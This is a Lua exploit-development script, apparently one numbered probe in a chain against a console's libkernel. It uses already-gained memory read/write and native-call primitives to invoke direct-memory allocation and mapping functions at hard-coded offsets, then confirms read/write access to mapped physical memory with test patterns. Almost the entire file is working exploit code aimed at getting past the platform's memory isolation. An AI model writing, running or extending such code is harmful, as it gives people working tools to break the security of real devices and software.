-- CRASH_CLASS: LOW
-- PROBE 544h: MapDirectMemory — read results via native.read_buffer
--
-- 544g CONFIRMED: MapDM rv=0 (SUCCESS) from main thread!
-- But Lua print corrupts after the call — native handler damages Lua state.
--
-- Strategy: use native.read_buffer to read virt_out as raw bytes,
-- then hex-encode them BEFORE any Lua operation on the pointer.
-- Also: write a pattern to the mapped page and read it back.
--
-- If MapDM mapped phys 0x110010000 into a virtual page, we can:
-- 1. Read virt_out to get the virtual address
-- 2. Write 0xDEADBEEF to the mapped page
-- 3. Read it back to confirm R/W works

print("=== PROBE 544h: MapDM READBUF ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function hexdump_buf(buf, len)
    local out = ""
    for i = 0, len - 1 do
        local b = rd(to_num(buf) + i)
        if b then
            out = out .. string.format("%02X", b % 256)
        else
            out = out .. "??"
        end
    end
    return out
end

if not libkernel_base then print("FATAL: no libkernel_base"); return end
print("libkernel=" .. q(libkernel_base))
print("pid=" .. to_num(syscall.getpid()))

local map_fn = libkernel_base + uint64(0x15020)
local alloc_fn = libkernel_base + uint64(0x17EF0)

-- [A] AllocDM (16KB)
print("")
print("[A] AllocDM")
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  rv=" .. (ok_a and to_num(arv) or "FAIL") .. " phys=" .. q(phys))
if not ok_a or to_num(arv) ~= 0 then print("FATAL"); return end

-- [B] Prepare and read sentinels BEFORE calling MapDM
print("")
print("[B] Prepare")
local virt_out = memory.alloc(8)
wq(virt_out, uint64("0xDEADDEADDEADDEAD"))

-- Read virt_out hex BEFORE call to confirm sentinel
local pre_hex = hexdump_buf(virt_out, 8)
print("  virt_out pre=" .. pre_hex)

-- [C] Call MapDM
print("")
print("[C] MapDM")
local ok_m, mrv = pcall(function()
    return native.fcall_with_rax(map_fn, 0,
        uint64(virt_out), uint64(0x4000), uint64(3),
        uint64(0), phys, uint64(0x4000))
end)

-- Print rv IMMEDIATELY (this still works in 544g before corruption)
print("  pcall=" .. tostring(ok_m))
if ok_m then
    print("  rv=" .. to_num(mrv))
end

-- [D] Read virt_out using read_dword (byte by byte, avoid rq which may corrupt)
print("")
print("[D] Read virt_out bytes")
local post_hex = hexdump_buf(virt_out, 8)
print("  virt_out post=" .. post_hex)

-- Parse the 8-byte LE pointer from hex
local b = {}
for i = 0, 7 do
    local v = rd(to_num(virt_out) + i)
    b[i] = v and (v % 256) or 0
end
local virt_lo = b[0] + b[1]*0x100 + b[2]*0x10000 + b[3]*0x1000000
local virt_hi = b[4] + b[5]*0x100 + b[6]*0x10000 + b[7]*0x1000000
print(string.format("  virt_addr = 0x%08X%08X", virt_hi, virt_lo))

-- Check if sentinel changed
local sentinel_dead = (virt_hi == 0xDEADDEAD and virt_lo == 0xDEADDEAD)
if sentinel_dead then
    print("  SENTINEL UNCHANGED — MapDM didn't write virt_out")
    print("  (even with rv=0, the pointer wasn't updated)")
else
    print("  *** VIRTUAL ADDRESS RECEIVED ***")

    -- Reconstruct as uint64
    local virt = uint64(string.format("0x%X%08X", virt_hi, virt_lo))
    print("  mapped at " .. q(virt))

    -- [E] R/W test on mapped physical memory
    print("")
    print("[E] R/W test")

    -- Write pattern
    local ok_w = wd(virt, 0xDEADBEEF)
    print("  write 0xDEADBEEF ok=" .. tostring(ok_w))

    if ok_w then
        local readback = rd(to_num(virt))
        if readback then
            if readback < 0 then readback = readback + 0x100000000 end
            print(string.format("  readback = 0x%08X", readback))
            if readback == 0xDEADBEEF then
                print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
                print("  *** WE HAVE DIRECT MEMORY ACCESS ***")

                -- Write second pattern to be sure
                wd(virt, 0xCAFEBABE)
                local rb2 = rd(to_num(virt))
                if rb2 then
                    if rb2 < 0 then rb2 = rb2 + 0x100000000 end
                    print(string.format("  second pattern: 0x%08X", rb2))
                end

                -- Read a few dwords of the mapped page
                print("")
                print("[F] First 64 bytes of mapped page:")
                for off = 0, 60, 4 do
                    local dw = rd(to_num(virt) + off)
                    if dw then
                        if dw < 0 then dw = dw + 0x100000000 end
                        print(string.format("  [+0x%02X] 0x%08X", off, dw))
                    end
                end
            else
                print("  MISMATCH — page may not be writable")
            end
        else
            print("  read FAULT on mapped page")
        end
    else
        print("  write FAULT on mapped page")
    end
end

print("")
print("canary=" .. tostring(pcall(function() return syscall.getpid() end)))
print("=== 544h DONE ===")
